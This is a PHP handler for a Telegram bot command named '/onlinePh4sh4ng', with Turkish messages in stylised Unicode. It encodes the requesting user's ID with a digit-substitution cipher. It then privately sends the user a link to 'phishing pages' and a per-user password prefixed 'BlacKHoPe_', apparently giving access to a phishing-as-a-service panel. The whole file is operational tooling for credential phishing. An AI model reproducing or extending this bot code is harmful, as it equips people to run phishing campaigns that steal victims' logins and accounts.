<?php

/////////////////////////

# ONLİNE PH4SH4NG COMMANDS


if ( $User_Message[0] == "/onlinePh4sh4ng" or $User_Message[0] == "/onlinePh4sh4ng$Bot_Username" ){

	//User_Controls("creator");

	//User_Controls("admin","0","True");

	function base_id ($user_id, $settings) {

	/* ENCODE 1 > Telegram Password */

	/* ENCODE 2 > Link İd  */

	if ($settings == "encode"){

		$id = str_replace(
			[
				'1','2','3','4','5','6','7','8','9','0'

			],[
				't','K','a','U','m','R','q','u','T','r'

			], $user_id);
	}

	if ($settings == "decode"){

		$id = str_replace(
			[

				't','K','a','U','m','R','â','u','T','r'

			],[

				'1','2','3','4','5','6','7','8','9','0'

			], $user_id);

	}

	if ($settings == "encode_2"){

		$id = str_replace(
			[
				'1','2','3','4','5','6','7','8','9','0'

			],[
				'K','H','o','B','l','P','e','a','c','_'

			], $user_id);
	}

	if ($settings == "decode_2"){

		$id = str_replace(
			[

				'K','H','o','B','l','P','e','a','c','_'

			],[

				'1','2','3','4','5','6','7','8','9','0'

			], $user_id);

	}

	return $id ;

	}

	$encode_id = base_id($user_id,"encode");


	$userControl = bot('getChat',['chat_id'=>$user_id]);

	if ( $userControl->ok != "1" ){
		bot('sendMessage',[
			'chat_id'=>_CHAT_ID,
			'text'=> "*❗ Bᴜ ᴋᴏᴍᴜᴛᴜ ᴋᴜʟʟᴀɴᴀʙɪʟᴍᴇᴋ ɪᴄɪɴ ᴏɴᴄᴇʟɪᴋʟᴇ ʙᴏᴛᴜ ʙᴀꜱʟᴀᴛᴍᴀʟɪꜱɪɴ...*\n\n[Bᴏᴛᴜ Bᴀꜱʟᴀᴛ](tg://user?id=$Bot_Id)",
			'parse_mode'=>"markdown",
			'disable_web_page_preview'=>"true",
			'reply_to_message_id'=>_MESSAGE_ID
		]);

		exit();
	}

	$messageControl = bot('sendPhoto',[
		'chat_id'=>$user_id,
		//'photo'=>"AgACAgQAAxkBAAJAlmIAAUla6rM3mtbHb9ZTff1opSnNfwACdLcxG1LKCFAg_afKHgyOGwEAAwIAA3MAAyME",
		'photo'=>"AgACAgQAAxkBAAJ9W2J7iIFd4TxdjROOrJyEFQffadhFAAI-ujEbjFfZU9XQKIb84MaBAQADAgADeQADJAQ",
		'caption'=>"*Oɴʟɪɴᴇ Pʜ4ꜱʜ4ɴɢ 🔻*\n\n──────────────\n\n*Pʜ4ꜱʜ4ɴɢ Pᴀɢᴇꜱ Lɪɴᴋ 🔻*\n\n`$onlinePhishing`\n\n*Pᴀꜱꜱwᴏʀᴅ 🔻*\n\n`BlacKHoPe_$encode_id`\n\n\nNᴏᴛ : Sɪғʀᴇʏɪ ᴋɪᴍꜱᴇʏʟᴇ ᴘᴀʏʟᴀꜱᴍᴀ ꜱɪғʀᴇ ᴅᴇɢɪꜱᴛɪʀᴇʟᴇᴍᴇᴢ...❗\n\n──────────────",
		'parse_mode'=>"markdown",
		'disable_web_page_preview'=>"true"
	]);

	$messageControlResult = $messageControl->ok;

	if ( $messageControl->ok != "1" ){

		bot('sendMessage',[
			'chat_id'=>_CHAT_ID,
			'text'=> "*❗ Bᴜ ᴋᴏᴍᴜᴛᴜ ᴋᴜʟʟᴀɴᴀʙɪʟᴍᴇᴋ ɪᴄɪɴ ᴏɴᴄᴇʟɪᴋʟᴇ ʙᴏᴛᴜ ʏᴇɴɪᴅᴇɴ ʙᴀꜱʟᴀᴛᴍᴀʟɪꜱɪɴ...*\n\n[Bᴏᴛᴜ Yᴇɴɪᴅᴇɴ Bᴀꜱʟᴀᴛ](tg://user?id=$Bot_Id)",
			'parse_mode'=>"markdown",
			'disable_web_page_preview'=>"true",
			'reply_to_message_id'=>_MESSAGE_ID
		]);

		exit();

	}

	if ($chat_type != "private"){

		bot('sendMessage',[
			'chat_id'=>_CHAT_ID,
			'text'=> "*✅ Oɴʟɪɴᴇ ᴘʜ4ꜱʜ4ɴɢ Kᴏᴍᴜᴛ Mᴇꜱᴀᴊɪ ʙᴏᴛᴀ ɢᴏɴᴅᴇʀɪʟᴅɪ...*",
			'parse_mode'=>"markdown",
			'reply_to_message_id'=>_MESSAGE_ID
		]);
	}

	exit();

}

/////////////////////////


?>
